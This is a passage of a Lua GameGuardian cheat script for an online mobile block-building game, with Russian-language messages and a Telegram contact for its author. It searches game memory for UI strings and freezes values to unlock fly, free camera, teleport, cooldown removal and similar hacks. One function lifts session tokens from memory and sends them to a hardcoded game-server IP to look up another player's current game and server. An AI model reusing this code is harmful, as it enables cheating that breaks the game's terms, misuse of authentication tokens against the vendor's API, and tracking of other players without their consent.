elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('H') and h[i+2].value == string.byte('i') and h[i+3].value == string.byte('d') and h[i+4].value == string.byte('e') and h[i+5].value == string.byte('A') and h[i+6].value == string.byte('n') and h[i+7].value == string.byte('d') and h[i+8].value == string.byte('S') and h[i+9].value == string.byte('e') and h[i+10].value == string.byte('e') and h[i+11].value == string.byte('k') and h[i+12].value == string.byte('-') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
if h[i+13].value == string.byte('O') and h[i+14].value == string.byte('p') and h[i+15].value == string.byte('e') then
MainUI['FreeCam']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+13].value == string.byte('C') and h[i+14].value == string.byte('h') and h[i+15].value == string.byte('a') then
MainUI['FreeCamYaw']={address=h[i+16].address,flags=4,freeze=true,value=1}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('C') and h[i+2].value == string.byte('o') and h[i+3].value == string.byte('m') and h[i+4].value == string.byte('m') and h[i+5].value == string.byte('o') and h[i+6].value == string.byte('n') and h[i+7].value == string.byte('-') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI.BowUI={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('B') and h[i+2].value == string.byte('r') and h[i+3].value == string.byte('e') and h[i+4].value == string.byte('a') and h[i+5].value == string.byte('k') and h[i+6].value == string.byte('-') and h[i+7].value == string.byte('B') and h[i+8].value == string.byte('l') and h[i+9].value == string.byte('o') and h[i+10].value == string.byte('c') and h[i+11].value == string.byte('k') and h[i+12].value == string.byte('-') and h[i+13].value == string.byte('P')and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
local t=gg.getValues({{address=h[i+1].address+0x2A,flags=2}})[1].value
if t==string.byte('P') then
MainUI.Krug2={address=h[i+16].address,flags=4,freeze=true,value=257}
else
MainUI.Krug={address=h[i+16].address,flags=4,freeze=true,value=257}
end
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('C') and h[i+2].value == string.byte('a') and h[i+3].value == string.byte('m') and h[i+4].value == string.byte('e') and h[i+5].value == string.byte('r') and h[i+6].value == string.byte('a') and h[i+7].value == string.byte('-') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
if h[i+8].value == string.byte('L') and h[i+9].value == string.byte('o') and h[i+10].value == string.byte('c') and h[i+11].value == string.byte('k') and h[i+12].value == 0 then
MainUI['FreeCamLock']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+8].value == string.byte('U') and h[i+9].value == string.byte('n') and h[i+10].value == string.byte('l') and h[i+11].value == string.byte('o') and h[i+12].value == string.byte('c') and h[i+13].value == string.byte('k') and h[i+14].value == 0 then
MainUI['FreeCamUnlock']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+8].value == string.byte('C') and h[i+9].value == string.byte('h') and h[i+10].value == string.byte('a') and h[i+11].value == string.byte('n') and h[i+12].value == string.byte('g') and h[i+13].value == string.byte('e') and h[i+14].value == string.byte('-') and h[i+15].value == string.byte('S') then
MainUI['FreeCamStatus']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('C') and h[i+2].value == string.byte('h') and h[i+3].value == string.byte('a') and h[i+4].value == string.byte('n') and h[i+5].value == string.byte('g') and h[i+6].value == string.byte('e') and h[i+7].value == string.byte('-') and h[i+8].value == string.byte('A') and h[i+9].value == string.byte('c') and h[i+10].value == string.byte('t') and h[i+11].value == string.byte('o') and h[i+12].value == string.byte('r') and h[i+13].value == 0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['FreeCamActor']={address=h[i+16].address,flags=4,freeze=true,value=1}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('J') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('m') and h[i+4].value == string.byte('p') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
if h[i+5].value == 0 then
MainUI['Jump']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+5].value == 45 and h[i+6].value == string.byte('C') then
MainUI['JumpSt']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('F') and h[i+2].value == string.byte('l') and h[i+3].value == string.byte('y') and h[i+4].value == 0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['Fly']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('U') and h[i+2].value == string.byte('p') and h[i+3].value == 0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['FlyUp']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('D') and h[i+2].value == string.byte('r') and h[i+3].value == string.byte('o') and h[i+4].value == string.byte('p') and h[i+5].value == 0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['FlyDrop']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('D') and h[i+2].value == string.byte('o') and h[i+3].value == string.byte('w') and h[i+4].value == string.byte('n') and h[i+5].value == 0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['FlyDown']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end

elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('S') and h[i+2].value == string.byte('k') and h[i+3].value == string.byte('i') and h[i+4].value == string.byte('l') and h[i+5].value == string.byte('l') and h[i+6].value == string.byte('-')and h[i+16]then
if (h[i+16].value==257 or h[i+16].value==256 or h[i+16].value==1) and h[i+7].value == string.byte('R') then
MainUI['SkillBtn']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif (h[i+16].value==257 or h[i+16].value==256 or h[i+16].value==1) and h[i+7].value == string.byte('B') then
MainUI['SkillEffect']={address=h[i+16].address,flags=4,freeze=true,value=1}
UICount=UICount+1
elseif h[i+7].value == string.byte('O') then
t=gg.getValues({{address=h[i+7].address+0x28,flags=4}})[1].value
if t==257 or t==1 then
MainUI['SkillMain']={address=h[i+7].address+0x28,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end

elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('B') and h[i+2].value == string.byte('e') and h[i+3].value == string.byte('d') and h[i+4].value == string.byte('W') and h[i+5].value == string.byte('a') and h[i+6].value == string.byte('r') and h[i+7].value == string.byte('-') and h[i+8].value == string.byte('B') and h[i+9].value == string.byte('o') and h[i+10].value == string.byte('w') and h[i+11].value == string.byte('S') and h[i+12].value == string.byte('h') and h[i+13].value == string.byte('o') and h[i+14].value == string.byte('o') and h[i+15].value == string.byte('t') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
local t=gg.getValues({{address=h[i+15].address+4,flags=2},{address=h[i+15].address+6,flags=2},{address=h[i+15].address+8,flags=2},{address=h[i+15].address+10,flags=2}})
if t[1].value==string.byte('C') and t[2].value==string.byte('r') and t[3].value==string.byte('o') and t[4].value==string.byte('s') then
MainUI['Krest']={address=h[i+16].address,flags=4,freeze=true,value=257}
elseif t[1].value==string.byte('O') and t[2].value==string.byte('p') and t[3].value==string.byte('e') and t[4].value==string.byte('r') then
MainUI['MainKR']={address=h[i+16].address,flags=4,freeze=true,value=257}
elseif t[1].value==string.byte('b') and t[2].value==string.byte('t') and t[3].value==string.byte('n') and t[4].value~=string.byte('-') then
MainUI['MainAttackBtn']={address=h[i+16].address,flags=4,freeze=true,value=257}
elseif t[1].value==string.byte('b') and t[2].value==string.byte('t') and t[3].value==string.byte('n') and t[4].value==string.byte('-') then
MainUI['MainAttackBtn2']={address=h[i+16].address,flags=4,freeze=true,value=257}
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('A') and h[i+2].value == string.byte('t') and h[i+3].value == string.byte('t') and h[i+4].value == string.byte('a') and h[i+5].value == string.byte('c') and h[i+6].value == string.byte('k') and h[i+7].value == string.byte('-') and h[i+8].value~= string.byte('B') and h[i+16] then
if h[i+8].value==string.byte('b') and h[i+11].value==0 and (h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256) then
MainUI.BtnAttack={address=h[i+16].address,flags=4,freeze=true,value=257}
elseif h[i+8].value==string.byte('b') and h[i+11].value==string.byte('-') and (h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256) then
MainUI.BtnAttackImg={address=h[i+16].address,flags=4,freeze=true,value=257}
elseif h[i+8].value == string.byte('O') then
t=gg.getValues({{address=h[i+8].address+0x26,flags=4}})[1].value
if t==257 or t==1 or t==256 then
MainUI.BtnAttackMain={address=h[i+8].address+0x26,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i+8].value == string.byte('C') then
t=gg.getValues({{address=h[i+8].address+0x30,flags=4},{address=h[i+8].address+0x14,flags=2}})
if (t[1].value==257 or t[1].value==1 or t[1].value==256) and t[2].value==0 then
MainUI.BtnAttackKrest={address=h[i+8].address+0x30,flags=4,freeze=true,value=1}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('B') and h[i+2].value == string.byte('l') and h[i+3].value == string.byte('o') and h[i+4].value == string.byte('c') and h[i+5].value == string.byte('k') and h[i+6].value == string.byte('C') and h[i+7].value == string.byte('i') and h[i+8].value == string.byte('t') and h[i+9].value == string.byte('y') and h[i+10].value == string.byte('-') and h[i+11].value == string.byte('F') and h[i+12].value == string.byte('l') and h[i+13].value == string.byte('y') and h[i+14].value == string.byte('-') and h[i+15].value == string.byte('w') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['FlyEffect']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('G') and h[i+2].value == string.byte('l') and h[i+3].value == string.byte('i') and h[i+4].value == string.byte('d') and h[i+5].value == string.byte('e') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['Glide']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('D') and h[i+2].value == string.byte('a') and h[i+3].value == string.byte('r') and h[i+4].value == string.byte('k') and h[i+5].value == string.byte('-') and h[i+6].value == string.byte('M') and h[i+7].value == string.byte('a') and h[i+8].value == string.byte('s') and h[i+9].value == string.byte('k') and h[i+16] then
t=gg.getValues({{address=h[i+9].address+0x1E,flags=4}})[1].value
if t==1 or t==257 then
MainUI['DarkMask']={address=h[i+9].address+0x1E,flags=4,freeze=true,value=1}
end
elseif h[i].value == string.byte('C') and h[i+1].value == string.byte('o') and h[i+2].value == string.byte('n') and h[i+3].value == string.byte('t') and h[i+4].value == string.byte('r') and h[i+5].value == string.byte('o') and h[i+6].value == string.byte('l') and h[i+7].value == string.byte('-') and h[i+8].value == string.byte('s') and h[i+9].value == string.byte('n') and h[i+10].value == string.byte('e') and h[i+11].value == string.byte('a') and h[i+12].value == string.byte('k')and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['Sneak']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('T') and h[i+2].value == string.byte('e') and h[i+3].value == string.byte('m') and h[i+4].value == string.byte('p') and h[i+5].value == string.byte('F') and h[i+6].value == string.byte('l') and h[i+7].value == string.byte('y') and h[i+8].value == 0 and h[i+16] then
if h[i+16].value==256 then
MainUI['SkyBlockShit']={address=h[i+16].address,flags=4,freeze=true,value=256}
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('T') and h[i+2].value == string.byte('e') and h[i+3].value == string.byte('m') and h[i+4].value == string.byte('p') and h[i+5].value == string.byte('F') and h[i+6].value == string.byte('l') and h[i+7].value == string.byte('y') and h[i+8].value == string.byte('-') and h[i+9].value == string.byte('C')and h[i+10].value == string.byte('u')and h[i+11].value == string.byte('s')and h[i+12].value == string.byte('t')and h[i+13].value == string.byte('o')and h[i+14].value == string.byte('m')and h[i+15].value == string.byte('I') and h[i+16] then
table.insert(skyBlockShit,{address=h[i+16].address+-12,flags=4})
elseif h[i].value == string.byte('C') and h[i+1].value == string.byte('o') and h[i+2].value == string.byte('n') and h[i+3].value == string.byte('t') and h[i+4].value == string.byte('r') and h[i+5].value == string.byte('o') and h[i+6].value == string.byte('l') and h[i+7].value == string.byte('-') and h[i+8].value == string.byte('f') and h[i+9].value == string.byte('o') and h[i+10].value == string.byte('r') and h[i+11].value == string.byte('w') and h[i+12].value == string.byte('a')and h[i+13].value == string.byte('r')and h[i+14].value == string.byte('d')and h[i+15].value==0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['Forward']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('P') and h[i+2].value == string.byte('o') and h[i+3].value == string.byte('l') and h[i+4].value == string.byte('e') and h[i+5].value == string.byte('C') and h[i+6].value == string.byte('o') and h[i+7].value == string.byte('n') and h[i+8].value == string.byte('t') and h[i+9].value == string.byte('r') and h[i+10].value == string.byte('o') and h[i+11].value == string.byte('l') and h[i+12].value == string.byte('-')and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
if h[i+13].value == string.byte('C')and h[i+14].value == string.byte('e')and h[i+15].value == string.byte('n') then
MainUI['Pole']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+13].value == string.byte('B')and h[i+14].value == string.byte('G')and h[i+15].value == 0 then
MainUI['PoleBG']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('C') and h[i+1].value == string.byte('o') and h[i+2].value == string.byte('n') and h[i+3].value == string.byte('t') and h[i+4].value == string.byte('r') and h[i+5].value == string.byte('o') and h[i+6].value == string.byte('l') and h[i+7].value == string.byte('-') and h[i+8].value == string.byte('r') and h[i+9].value == string.byte('i') and h[i+10].value == string.byte('g') and h[i+11].value == string.byte('h') and h[i+12].value == string.byte('t')and h[i+13].value ==0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['Right']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('C') and h[i+1].value == string.byte('o') and h[i+2].value == string.byte('n') and h[i+3].value == string.byte('t') and h[i+4].value == string.byte('r') and h[i+5].value == string.byte('o') and h[i+6].value == string.byte('l') and h[i+7].value == string.byte('-') and h[i+8].value == string.byte('l') and h[i+9].value == string.byte('e') and h[i+10].value == string.byte('f') and h[i+11].value == string.byte('t')and h[i+12].value ==0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['Left']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
--Main-throwpot-Controls
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('t') and h[i+2].value == string.byte('h') and h[i+3].value == string.byte('r') and h[i+4].value == string.byte('o') and h[i+5].value == string.byte('w') and h[i+6].value == string.byte('p') and h[i+7].value == string.byte('o') and h[i+8].value == string.byte('t') and h[i+9].value == string.byte('-') and h[i+10].value == string.byte('C') and h[i+11].value == string.byte('o')and h[i+12].value == string.byte('n')and h[i+13].value == string.byte('t')and h[i+14].value == string.byte('r')and h[i+15].value == string.byte('o') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['wizardtnt']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('A') and h[i+2].value == string.byte('t') and h[i+3].value == string.byte('t') and h[i+4].value == string.byte('a') and h[i+5].value == string.byte('c') and h[i+6].value == string.byte('k') and h[i+7].value == string.byte('-') and h[i+8].value == string.byte('B') and h[i+9].value == string.byte('t') and h[i+10].value == string.byte('n') and h[i+11].value == 0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
MainUI['wizardtnt2']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == string.byte('-') and h[i+1].value == string.byte('A') and h[i+2].value == string.byte('u') and h[i+3].value == string.byte('t') and h[i+4].value == string.byte('o') and h[i+5].value == string.byte('R') and h[i+6].value == string.byte('u') and h[i+7].value == string.byte('n') and h[i+8].value == string.byte('-') and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
if h[i+9].value==string.byte('F') then
MainUI['wizardtnt3']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif h[i+9].value==string.byte('T') then
MainUI['wizardtnt4']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
end
elseif h[i].value == string.byte('C') and h[i+1].value == string.byte('o') and h[i+2].value == string.byte('n') and h[i+3].value == string.byte('t') and h[i+4].value == string.byte('r') and h[i+5].value == string.byte('o') and h[i+6].value == string.byte('l') and h[i+16] then
if (h[i+7].value == string.byte('-') and h[i+8].value == string.byte('t') and h[i+9].value == string.byte('o') and h[i+10].value == string.byte('p') and h[i+11].value == string.byte('-')and h[i+12].value == string.byte('l')and h[i+13].value == string.byte('e')and h[i+14].value == string.byte('f')and h[i+15].value == string.byte('t')) and (h[i+16].value==1 or h[i+16].value==257) then
btnmain[#btnmain+1]={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif (h[i+7].value == string.byte('-') and h[i+8].value == string.byte('t') and h[i+9].value == string.byte('o') and h[i+10].value == string.byte('p') and h[i+11].value == string.byte('-')and h[i+12].value == string.byte('r')and h[i+13].value == string.byte('i')and h[i+14].value == string.byte('g')and h[i+15].value == string.byte('h')) and (h[i+16].value==1 or h[i+16].value==257) then
btnmain[#btnmain+1]={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif (h[i+7].value == string.byte('-') and h[i+8].value == string.byte('b') and h[i+9].value == string.byte('a') and h[i+10].value == string.byte('c') and h[i+11].value == string.byte('k')and h[i+12].value == 0) and (h[i+16].value==1 or h[i+16].value==257) then
MainUI['Back']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
elseif (h[i+7].value == string.byte('-') and h[i+8].value == string.byte('T') and h[i+9].value == string.byte('e') and h[i+10].value == string.byte('l') and h[i+11].value == string.byte('e')) and (h[i+16].value==1 or h[i+16].value==257 or h[i+16].value==256) then
MainUI['TP']={address=h[i+16].address,flags=4,freeze=true,value=257}
UICount=UICount+1
end
elseif h[i].value == 0 and h[i+16] then
if h[i+16].value==1 or h[i+16].value==257 then
local t=gg.getValues({{address=h[i].address-40,flags=4}})[1].value
if t==32 then
MainUI['UpdateMain']={address=h[i+16].address,flags=4,freeze=true,value=1}UICount=UICount+1 end end end end
gg.clearResults()
gg.searchNumber(':Main.json',1)gg.refineNumber(':M',1)t=gg.getResults(1337)
for i=1,#t do
t[i].flags = 4
t[i].address = t[i].address + 0xff
end
gg.loadResults(t)
gg.refineNumber(15,4)
local t=gg.getResults(1)[1].address
gg.clearResults()
MainUI.time1={address=t+0x34,flags=4,freeze=true,value=0}
MainUI.time2={address=t+0x38,flags=4,freeze=true,value=0}
MainUI.time3={address=t+0x3C,flags=4,freeze=true,value=0}
Main10.TPtime={address=t+0x40,flags=4,freeze=true,value=0}
Main10.Skilltime={address=t+0x360,flags=4,freeze=true,value=0}
function setTime1(ms,c,t)
if not t then
spisok={}
end
if c == 2 then
MainUI.time1.value = ms
table.insert(spisok,MainUI.time1)
elseif c == 1 then
MainUI.time2.value = ms
table.insert(spisok,MainUI.time2)
elseif c == 3 then
MainUI.time3.value = ms
table.insert(spisok,MainUI.time3)
end
if not t then
gg.addListItems(spisok)
gg.clearList()
end
end

function antiCrash2()
if len >= 41 then --text size(count of characters)
h=len-40
ar123={}
d=0
for i=1,h do
d=d+2
if d>71 and d<85 then
else
table.insert(ar123,{address=UI3[1].address+0x8EE+raznica+d,flags=2,freeze=true,value=0})
end
end
end
end

function getPlSt()
pl=gg.prompt({'id игрока'},{16},{'number'})
if pl and tonumber(pl[1],10) then
if not token1 or not token2 then
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.clearResults()gg.clearList()gg.searchNumber(':http://43.157.89.133',1)gg.refineNumber(':h',1)
if gg.getResultsCount()==0 then gg.alert('info not found')do return end end
t=gg.getResults(1).address
gg.clearResults()
gg.searchNumber(':eyJhb',1,_,_,t-500,t)
t=gg.getResults(1)[1].address-1
gg.clearResults()sp={}for i=1,458 do sp[i]={address=t+i,flags=1}end sp=gg.getValues(sp)sp2={}for i=1,#sp do if sp[i].value~=0 then sp2[i]=sp[i]else break end end
token1=UTF_8(sp2)
gg.setRanges(gg.REGION_OTHER)
gg.clearResults()gg.clearList()gg.searchNumber(':token":{"mValue":"e',1)gg.refineNumber(':"e',1)t=gg.getResults(1)[1].address gg.clearResults()sp={}for i=1,500 do sp[i]={address=t+i,flags=1}end sp=gg.getValues(sp)sp2={}for i=1,#sp do  
if sp[i].value==34 then
break
else
sp2[i]=sp[i]end end
token2=UTF_8(sp2)
end


headers={
["x-shahe-uid"]=Open.MyID.value,
["x-shahe-token"]=token1,
["userId"]=Open.MyID.value,
['Access-Token']=token2,
['Content-Type']='application/json; charset=UTF-8'
}
body='{"targetId": '..pl[1]..',"userId": '..Open.MyID.value..',"ever": 10111,"name": "Wizard"}'
print(body)
t=gg.makeRequest('http://43.157.89.133:9902/v1/follow',headers,body).content

if string.find(t,'code":1,') then
t=t:gsub(',','\n')
t=t:gsub('{','')
t=t:gsub('}','')
t=t:gsub('%]','')
t=t:gsub('%[','')
t=t:gsub('":',': ')
t=t:gsub('"','')
t=wzrd777(t,{'gaddr:','mid:','gameType:'})
t=t:gsub('\n','"\n')
t=t:gsub(': ','="')
t=t..'"'
t=t:gsub('gameType','pgame')
pcall(load(t))
info='Current Game: '..getGameName2(pgame)..' ('..mid..')\nCurrent Server: '..gaddr
else
info=t
end
text='Info about player(ID:'..pl[1]..')\n\n'..info
gg.alert(text)
end end

function setText228(text,UI,color,pos,time,tc)
len = WizardUtf8.len(text)
spisok={}
spisok[1],spisok[2],spisok[3]={['address']=UI[1].address+0x880+raznica,['flags']=4,['freeze']=true,['value']=32},{['address']=UI[1].address+0xA28+raznica,['flags']=4,['freeze']=true,['value']=0},{['address']=UI[1].address+0xA30+raznica,['flags']=4,['freeze']=true,['value']=32}
if dd75 then
hj7={spisok[3]}
end
if not aimbotst then
antiCrash2()
end
if pos then
spisok[4]={address=UI[1].address+0x9D4+raznica,flags=16,freeze=true,value=pos}
end
if color then
spisok[5]={['address']=UI[1].address+0x154,['flags']=16,['freeze']=true,['value']=color[1]}
spisok[6]={['address']=UI[1].address+0x158,['flags']=16,['freeze']=true,['value']=color[2]}
spisok[7]={['address']=UI[1].address+0x15C,['flags']=16,['freeze']=true,['value']=color[3]}
end
textn={}
for i in text:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(textn,t)
end
t=0
for b = 1,len do
table.insert(spisok,{['address']=UI[1].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=textn[b]})t=t+2
end
table.insert(spisok,{['address']=UI[1].address+0x878+raznica,['flags']=4,['freeze']=true,['value']=len})
table.insert(spisok,{address=UI[1].address+0x938+raznica,flags=16,['freeze']=true,['value']=-1})
--j=gg.getValues(spisok)
--gg.addListItems(j)os.exit()
setTime1(time,tc,true)
if not aimbotst1 then
gg.addListItems(spisok)
gg.clearList()
else
for i=1,#spisok do
table.insert(tsp,spisok[i])
end
end
end



function bottomText2(text,color)
if not btmtext2 then
btmtext2=true
end
len,sp=WizardUtf8.len(text),{}
for i in text:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(sp,t)
end
t=0
for b = 1,len do
tsp['penistextt'..b]={['address']=MainUI['btmtext2'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=sp[b]}t=t+2
end
if Open.timerUI3.value>1 then
ytv=0.694444444
else
ytv=0.729
end
tsp.updpenistextt1,tsp.updpenistextt2,tsp.updpenistextt3,tsp.updpenistextt4,tsp.updpenistextt5,tsp.updpenistextt6,tsp.updpenistextt7,tsp.updpenistextt8,tsp.updpenistextt9,tsp.updpenistextt10,tsp.updpenistextt11={address=MainUI.btmtext2.address+0x9D8,flags=16,freeze=true,value=1.1},{address=MainUI.btmtext2.address+0xA24,flags=16,freeze=true,value=1.1},{address=MainUI.btmtext2.address+0x154,flags=16,freeze=true,value=color[1]},{address=MainUI.btmtext2.address+0x158,flags=16,freeze=true,value=color[2]},{address=MainUI.btmtext2.address+0x15c,flags=16,freeze=true,value=color[3]},MainUI.btmtext2,{address=MainUI.btmtext2.address+0xa0,flags=16,freeze=true,value=Screen.X*0.373230373},{address=MainUI.btmtext2.address+0xa8,flags=16,freeze=true,value=Screen.X*0.373230373},{address=MainUI.btmtext2.address+0xa4,flags=16,freeze=true,value=Screen.Y*ytv},{address=MainUI.btmtext2.address+0xac,flags=16,freeze=true,value=Screen.Y*ytv},{address=MainUI.btmtext2.address+0x878+raznica,flags=4,freeze=true,value=len}
end

function bottomText(text,color)
if not btmtext then
btmtext=true
end
len,sp=WizardUtf8.len(text),{}
for i in text:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(sp,t)
end
t=0
for b = 1,len do
tsp['penistext'..b]={['address']=MainUI['btmtext'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=sp[b]}t=t+2
end
if Open.timerUI3.value>1 then
ytv=0.729
else
ytv=0.763888889
end
tsp.updpenistext1,tsp.updpenistext2,tsp.updpenistext3,tsp.updpenistext4,tsp.updpenistext5,tsp.updpenistext6,tsp.updpenistext7,tsp.updpenistext8,tsp.updpenistext9,tsp.updpenistext10,tsp.updpenistext11={address=MainUI.btmtext.address+0x9D8,flags=16,freeze=true,value=1.1},{address=MainUI.btmtext.address+0xA24,flags=16,freeze=true,value=1.1},{address=MainUI.btmtext.address+0x154,flags=16,freeze=true,value=color[1]},{address=MainUI.btmtext.address+0x158,flags=16,freeze=true,value=color[2]},{address=MainUI.btmtext.address+0x15c,flags=16,freeze=true,value=color[3]},MainUI.btmtext,{address=MainUI.btmtext.address+0xa0,flags=16,freeze=true,value=Screen.X*0.373230373},{address=MainUI.btmtext.address+0xa8,flags=16,freeze=true,value=Screen.X*0.373230373},{address=MainUI.btmtext.address+0xa4,flags=16,freeze=true,value=Screen.Y*ytv},{address=MainUI.btmtext.address+0xac,flags=16,freeze=true,value=Screen.Y*ytv},{address=MainUI.btmtext.address+0x878+raznica,flags=4,freeze=true,value=len}
end

function WizardMain(ui,text,time,tc,c1,cr2,pos)
len = WizardUtf8.len(text)
setText228(text,ui,c1,pos,time,tc)
if ar123 and not cr2 then
gg.sleep(50)
gg.addListItems(ar123)
gg.clearList()
ar123 = nil
else
cr2=nil
end
end
Wizard089()gg.searchNumber('105~150D;0.5~0.6::5',16,_,_,wizard089+-500000,wizard089+500000)
if gg.getResultsCount()~=0 then
gg.refineNumber('0.5~0.6',16)
t=gg.getResults(99999)
for i=1,#t do
t[i].value=1
t[i].freeze=true
end
gg.addListItems(t)
gg.clearList()
gg.clearResults()
end
odin101 = true
end


function getModMenu()
t=0 if UICount<39 then
gg.alert('Не удалось найти все необходимые UI, попробуй снова или напиши создателю скрипту в телеграм.\n тг:@ImFakeWizard','')os.exit()
end while true do
Screen,t,h={},t+1,gg.getValues({{address=MainUI['UpdateMain'].address+0xBC,flags=16},{address=MainUI['UpdateMain'].address+0xC0,flags=16}})if t>999 then gg.alert('Не удалось получить размер экрана, перезайди в игру и перезапусти скрипт.','')os.exit()end if h[1].value~=0 and h[2].value~=0 then Screen['X'],Screen['Y'],t=h[1].value,h[2].value,nil break end h=nil end
--[[W؜i؜za؜r؜d[S=vip_nameplate_
FFFFFFFFW؜i؜za؜r؜d[S=vip_nameplate_6.json]
gg.clearResults()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(':'..usernickname..'[S=vip_nameplate_',1)
gg.refineNumber(':'..utf8.char(utf8.codepoint(usernickname)),1)
t=gg.getResults(99999)
for i=1,#t do
t[i].flags=4
t[i].address=t[i].address+-31
end
gg.loadResults(t)gg.refineNumber('105~140',4)t=gg.getResults(1337) os.exit()]]
MainXa(16,0,1.62)
gg.clearResults()
gg.setRanges(16384 | 8)
gg.clearList()
gg.clearResults()
gg.searchNumber(':BlockCityPayment',1)
gg.refineNumber(':B',1)Wizard69=gg.getResults(1488)gg.clearResults()for i=1,#Wizard69 do Wizard69[i].address=Wizard69[i].address+0x7b Wizard69[i].flags=4 end gg.loadResults(Wizard69)gg.refineNumber(69,4)Wizard69=gg.getResults(1)[1].address
gg.clearResults()
gg.searchNumber(4428659729064379023,32)
t=gg.getResults(1)
MainUI['Wizard228']={address=t[1]['address']+0x30,flags=16,freeze=true,value=1}
MainUI['Wizard225']={address=t[1]['address']+0x34,flags=16,freeze=true,value=1}
MainUI['Wizard229']={address=t[1]['address']+0x38,flags=16,freeze=true,value=1}
gg.clearResults()
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.clearList()
gg.clearResults()
gg.searchNumber(4499096028797293909,32)
MainUI['Wizard13']={address=gg.getResults(1)[1].address,flags=32}
gg.clearResults()
